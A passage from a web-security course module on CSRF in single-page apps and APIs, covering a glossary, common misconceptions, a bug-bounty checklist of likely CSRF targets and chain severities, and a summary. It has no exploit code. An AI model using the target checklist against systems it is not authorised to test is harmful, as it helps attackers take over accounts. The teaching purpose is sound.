| **ACAO** | Access-Control-Allow-Origin — server header specifying which origins can read the response |
| **Origin reflection** | Server blindly copies Origin header into ACAO — dangerous misconfiguration |
| **Blind CSRF** | CSRF where the action executes but attacker cannot read the response |
| **GraphQL mutation** | State-changing GraphQL operation — CSRF target when sent via GET |
| **GraphQL batching** | Multiple GraphQL operations in a single request — amplifies CSRF impact |
| **JWT** | JSON Web Token — a token format; CSRF safety depends on delivery mechanism not format |
| **localStorage** | Browser storage scoped to origin; not accessible cross-origin; CSRF-safe for token storage |
| **sessionStorage** | Browser storage scoped to origin and tab; CSRF-safe; cleared on tab close |
| **Remember me cookie** | Persistent authentication cookie; introduces CSRF risk to previously header-auth endpoints |
| **Hybrid auth** | Using both cookie and header auth; any endpoint accepting cookie auth is CSRF-vulnerable |
| **Same-site boundary** | Registrable domain (eTLD+1); subdomains are same-site; SameSite does not isolate subdomains |

---

## 18. Common Misconceptions

### ❌ "SPAs don't need CSRF protection"
**Wrong.** SPAs using session cookies or any cookie-based authentication need CSRF protection. The SPA architecture changes nothing about the ambient authority problem. Only the authentication delivery mechanism matters.

### ❌ "application/json Content-Type prevents CSRF"
**Wrong.** It requires CORS preflight for cross-origin fetch(), raising the bar. It does not protect against same-site attackers, CORS misconfiguration, or text/plain JSON body attacks. It is defense-in-depth, not a primary defense.

### ❌ "Our API is on a different subdomain so it's isolated"
**Wrong.** Subdomains of the same registered domain are same-site. SameSite cookie restrictions do not apply between subdomains. Any compromised subdomain can make credentialed API calls.

### ❌ "JWT tokens prevent CSRF"
**Wrong.** JWT is a token format. JWT stored in a cookie is subject to the same ambient authority problem as any session cookie. JWT in an Authorization header is CSRF-safe — not because it's JWT, but because headers require explicit attachment.

### ❌ "CORS preflight is a security mechanism"
**Wrong.** CORS preflight is a gate that defers to the CORS policy. If the CORS policy is wrong, the preflight approves attacker requests. The security comes from the CORS policy, not from the preflight mechanism itself.

### ❌ "credentials: include bypasses SameSite"
**Wrong.** credentials: include instructs the browser to attempt cookie attachment. SameSite rules are still enforced. credentials: include is not an override of SameSite.

### ❌ "Adding a remember-me cookie doesn't affect our CSRF posture"
**Wrong.** Any endpoint that accepts cookie-based authentication as an alternative to header-based auth is now CSRF-vulnerable. The remember-me cookie is ambient — it travels automatically with every matching request.

---

## 19. Bug Bounty Reference

### Modern Architecture CSRF Targets

```
HIGH PRIORITY:
  □ Any API endpoint authenticated via session/JWT cookie
  □ GraphQL endpoints accepting GET mutations
  □ Endpoints with "remember me" cookie fallback auth
  □ CORS policies that reflect Origin or include attacker-controlled origins

MEDIUM PRIORITY:
  □ Endpoints where Content-Type is the only CSRF control
  □ APIs that parse JSON from text/plain bodies
  □ Subdomain XSS → same-site API request chain

INVESTIGATION TRIGGERS:
  □ login response sets cookie → check all authenticated endpoints
  □ CORS allows credentials → check if attacker origin can be allowlisted
  □ GraphQL API → test GET mutations and batching
  □ "remember me" feature → check endpoint auth logic
```

### Severity for Modern API CSRF

```
CORS misconfiguration + CSRF:
  → Two separate findings (CORS bug + CSRF bug)
  → Combined severity: Critical (full auth bypass + data read)

text/plain JSON CSRF:
  → Severity: based on action impact
  → Note: bypasses Content-Type defense claim

GraphQL GET mutation CSRF:
  → Severity: based on mutation impact
  → Note: explicitly bypasses SameSite=Lax

Subdomain XSS + same-site API request:
  → Chain severity: XSS impact + CSRF impact
  → Usually Critical (XSS + account takeover)
```

---

## 20. Module 8 Summary — What You Must Know Cold

```
CORE PRINCIPLE:
✓ CSRF risk = credential delivery mechanism, not architecture type
✓ Cookie = ambient = CSRF vulnerable (always)
✓ Authorization header = explicit = CSRF safe
✓ JWT format is irrelevant — delivery method is everything

CORS PREFLIGHT:
✓ Triggered by: application/json, custom headers, non-simple methods
✓ Not triggered by: GET, simple POST content types, same-site requests
✓ Preflight defers to CORS policy — it is not a security mechanism itself
✓ Correct CORS policy: exact allowlist, no reflection, ACAC only for trusted origins

CONTENT-TYPE DEFENSE:
✓ Partial mitigation — requires preflight for cross-origin fetch()
✓ Bypassed by: same-site XSS, CORS misconfig, text/plain JSON body
✓ Defense-in-depth only — not sufficient as primary CSRF defense

SAME-SITE IN SPA ARCHITECTURE:
✓ app.victim.com ↔ api.victim.com: same-site, SameSite doesn't restrict
✓ SameSite protects against evil.com (cross-site)
✓ CORS allowlist protects against other subdomains (cross-origin, same-site)
✓ Any subdomain compromise = credentialed access to API

GRAPHQL:
✓ POST JSON: same CSRF risk as any REST endpoint
✓ GET mutations: highest risk — Lax exception applies, no preflight
✓ Batching: single CSRF request can chain multiple mutations
✓ Disable GET mutations in production entirely

JWT:
✓ localStorage + header = CSRF safe (explicit attachment)
✓ Cookie (any type) = CSRF vulnerable (ambient authority)
✓ "We use JWTs" is not a CSRF defense unless delivery is via header

REMEMBER-ME COOKIE TRAP:
✓ Any cookie auth path on any endpoint = CSRF surface for that endpoint
✓ Previously safe header-auth endpoints become vulnerable
✓ Must add CSRF token to all cookie-authenticated paths

credentials: include:
✓ Instructs browser to attempt cookie attachment
✓ Not an override of SameSite — SameSite still enforced
✓ Response exposed to JS only if ACAC: true in response
✓ Blind CSRF possible: action executes even if response blocked
```

---

*Next: Module 09 — Framework-Level Mitigations*  
*What Django, Rails, Spring, Express actually implement, how their CSRF middleware works,*
*common misconfiguration patterns that silently disable protection,*
*and what "CSRF protection enabled" actually means in each framework*